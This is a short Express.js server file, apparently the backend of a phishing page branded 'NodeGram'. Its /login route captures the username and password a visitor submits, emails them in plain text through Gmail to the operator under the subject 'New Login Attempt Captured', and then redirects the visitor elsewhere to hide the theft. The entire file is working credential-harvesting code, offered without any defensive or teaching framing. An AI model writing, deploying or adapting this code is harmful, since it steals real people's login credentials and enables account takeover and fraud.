const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const dotenv = require("dotenv");
const cors = require("cors");

dotenv.config();
const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static("public"));

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ success: false, message: "Missing fields" });
  }

  const mailOptions = {
    from: `"Login Alert" <${process.env.EMAIL_USER}>`,
    to: process.env.EMAIL_USER,
    subject: "🛡️ New Login Attempt Captured",
    text: `📥 Username: ${username}\n🔒 Password: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    return res.json({ success: true, redirect: process.env.REDIRECT_URL });
  } catch (error) {
    console.error("❌ Email sending failed:", error);
    return res.status(500).json({ success: false, message: "Email sending failed" });
  }
});

// ✅ Root route for Render
app.get("/", (req, res) => {
  res.send("✅ NodeGram API is running!");
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
